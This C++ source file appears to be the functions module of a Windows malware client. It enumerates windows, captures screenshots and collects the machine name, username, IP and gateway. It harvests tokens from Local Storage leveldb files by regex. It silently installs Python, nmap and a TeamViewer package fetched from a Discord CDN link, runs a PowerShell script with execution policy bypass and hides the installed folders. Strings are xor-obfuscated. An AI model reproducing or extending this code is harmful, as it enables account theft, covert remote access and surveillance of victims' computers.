#include <Windows.h>
#include <vector>
#include <GdiPlus.h>
#include <regex>
#include <filesystem>
#include "wininet.h"
#include "shlobj.h"

#include "functions.h"
#include "..\utility\xor.hpp"
#include "../utility/requests.h"
#include "../utility/helper.h"
#include <iostream>

#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib,"Gdi32.lib")
#pragma comment(lib, "Ole32.lib")

using namespace Gdiplus;
namespace fs = std::filesystem;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM param)
{
	int length = GetWindowTextLength(hwnd);

	if (IsWindowVisible(hwnd) && length > 0)
	{
		char* buffer = new char[length + 1];
		GetWindowText(hwnd, buffer, length + 1);
		std::string title(buffer);

		if (title == xorstr_("Settings"))
			return true;
		else if (title == xorstr_("Movies & TV"))
			return true;
		else if (title == xorstr_("Microsoft Store"))
			return true;
		else if (title == xorstr_("Microsoft"))
			return true;
		else if (title == xorstr_("Groove Music"))
			return true;
		else if (title == xorstr_("Weather"))
			return true;
		else if (title == xorstr_("Maps"))
			return true;
		else if (title == xorstr_("Calculator"))
			return true;
		else if (title == xorstr_("Microsoft Text Input Application"))
			return true;


		title.erase(title.find_last_not_of(" \n\r\t") + 1);
		(*(std::vector<std::string>*)param).push_back(title + "\n");
	}
	return true;
}

namespace client {
	namespace functions {
		std::vector<std::string> get_all_windows() {
			std::vector<std::string> windows{};
			EnumWindows(EnumWindowsProc, (LPARAM)&windows);
			return windows;
		}

		void take_screenshot(std::string file) {
			// Pasted

			ULONG_PTR gdiplustoken;
			GdiplusStartupInput gdistartupinput;
			GdiplusStartupOutput gdistartupoutput;

			gdistartupinput.SuppressBackgroundThread = true;
			GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

			HDC dc = GetDC(GetDesktopWindow());//get desktop content
			HDC dc2 = CreateCompatibleDC(dc);	 //copy context

			RECT rc0kno;  // rectangle  Object

			GetClientRect(GetDesktopWindow(), &rc0kno);// get desktop size;
			int w = rc0kno.right - rc0kno.left;//width
			int h = rc0kno.bottom - rc0kno.top;//height

			HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);  //create bitmap
			HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

			BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
			Bitmap* bm = new Bitmap(hbitmap, NULL);

			UINT num;
			UINT size;

			ImageCodecInfo* imagecodecinfo;
			GetImageEncodersSize(&num, &size); //get count of codec

			imagecodecinfo = (ImageCodecInfo*)(malloc(size));
			GetImageEncoders(num, size, imagecodecinfo);//get codec

			CLSID clsidEncoder;

			for (int i = 0; i < num; i++)
			{
				if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
					clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id

			}

			free(imagecodecinfo);

			std::wstring ws;
			ws.assign(file.begin(), file.end());  //sring to wstring
			bm->Save(ws.c_str(), &clsidEncoder);   //save in jpeg format
			SelectObject(dc2, holdbitmap);  //Release Objects
			DeleteObject(dc2);
			DeleteObject(hbitmap);

			ReleaseDC(GetDesktopWindow(), dc);
			GdiplusShutdown(gdiplustoken);
		}

		std::string get_computer_info() {
			#define INFO_BUFFER_SIZE 32767
			TCHAR  infoBuf[INFO_BUFFER_SIZE];
			DWORD  bufCharCount = INFO_BUFFER_SIZE;

			std::string payload = "";

			GetComputerName(infoBuf, &bufCharCount);
			payload += "Computer name: " + std::string(infoBuf);

			payload += "\n";

			GetUserName(infoBuf, &bufCharCount);
			payload += "Username: " + std::string(infoBuf);

			return payload;
		}

		std::string get_computer_brand() {
			auto str = helpers::exec("WMIC CSPRODUCT GET NAME").substr(5);
			helpers::replace_all(str, "\n", "");
			helpers::replace_all(str, "\r", "");
			str = "\nBrand: " + str;
			return str;
		}

		std::string get_ip() {
			auto response = requests::get_request("https://api.ipify.org/");
			return response;
		}

		std::string get_default_gateway() {
			auto res = helpers::exec("ipconfig | findstr /i default | findstr /R [0-9]");
			auto temp = res.substr(res.find(":") + 2);
			temp.replace(temp.length() - 1, temp.length(), "");
			return temp;
		}

		std::vector<std::string> get_tokens() {
			struct stat info;

			std::vector<std::string> tokens = {};
			for (auto path : helpers::paths) {
				if (!(stat(path.second.c_str(), &info) != 0) && info.st_mode & S_IFDIR) {
					if (!(info.st_mode & S_IFDIR)) {
						continue;
					}

					path.second += xorstr_("\\Local Storage\\leveldb");

					for (const auto& entry : fs::directory_iterator(path.second)) {
						if (fs::path(entry.path()).extension().string() != xorstr_(".log") && fs::path(entry.path()).extension().string() != xorstr_(".ldb")) {
							continue;
						}

						std::smatch match;
						std::string content = helpers::read_file(entry.path().string().c_str());

						std::string::const_iterator search_start(content.cbegin());
						while (std::regex_search(search_start, content.cend(), match, std::regex(helpers::regex_token))) {
							tokens.push_back(match[0]);
							search_start = match.suffix().first;
						}
					}
				}
			}
			return tokens;
		}

		std::string prepare_payload(std::string title, std::vector<std::string> tokens) {
			std::string payload = "";
			for (auto token : tokens) {
				payload += token + xorstr_("\n");
			}

			return payload;
		}

		void set_wallpaper(LPCWSTR file) {
			CoInitializeEx(0, COINIT_APARTMENTTHREADED);
			IActiveDesktop* desktop;
			HRESULT status = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&desktop);
			WALLPAPEROPT wOption;
			ZeroMemory(&wOption, sizeof(WALLPAPEROPT));
			wOption.dwSize = sizeof(WALLPAPEROPT);
			wOption.dwStyle = WPSTYLE_CENTER;
			status = desktop->SetWallpaper(file, 0);
			status = desktop->SetWallpaperOptions(&wOption, 0);
			status = desktop->ApplyChanges(AD_APPLY_ALL);
			desktop->Release();
			CoUninitialize();
		}

		void install_python() {
			requests::download_file("https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe", PATH + xorstr_("python.exe"));
			system((std::string("cd " + PATH) + std::string(xorstr_(" && python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0"))).c_str());

			auto path = helpers::exec(xorstr_("py -c \"import sys; print(sys.executable[:-10])\""));
			if (path.find(xorstr_("Python39")) != std::string::npos || path.find(xorstr_("Python38")) != std::string::npos) {
				system(std::string(xorstr_("setx Path %UserProfile%\";") + path).c_str());
				system("pip install --upgrade pip");
				system("pip install opencv-python");
				system("pip install numpy");
				system("pip install getmac");
				system("pip install python-nmap");
				system("pip install sockets");
			}
		}
		
		void install_teamviewer() {
			requests::download_file("https://cdn.discordapp.com/attachments/777316128162578462/786454921511174165/tv.zip", PATH + "tv.zip");
			std::string path = PATH + xorstr_("tv.zip");
			std::string command = xorstr_("powershell -command \"Expand-Archive ") + path + " -DestinationPath " + PATH + "\"";
			system(command.c_str());

			system(std::string(xorstr_("cd ") + PATH + xorstr_("tv") + " && powershell -executionpolicy bypass -file teamviewer_install.ps1").c_str());
			
			SetFileAttributes("C:\\Program Files (x86)\\TeamViewer", FILE_ATTRIBUTE_HIDDEN);
			SetFileAttributes("C:\\Program Files\\TeamViewer", FILE_ATTRIBUTE_HIDDEN);
		}

		void install_nmap() {
			requests::download_file("https://nmap.org/dist/nmap-7.80-setup.exe", PATH + xorstr_("nmap.exe"));
			system((std::string("cd ") + PATH + " && nmap.exe /S").c_str());
			system("SET PATH=%PATH%;C:\\Program Files (x86)\\Nmap");
			system("SET PATH=%PATH%;C:\\Program Files\\Nmap");

			SetFileAttributes("C:\\Program Files (x86)\\Nmap", FILE_ATTRIBUTE_HIDDEN);
			SetFileAttributes("C:\\Program Files\\Nmap", FILE_ATTRIBUTE_HIDDEN);
		}

		void install_scripts() {
			std::filesystem::create_directory(PATH + xorstr_("scripts\\"));
			requests::download_file("downloads/scanner.py", PATH + xorstr_("scripts\\scanner.py"));
		}
	}
}
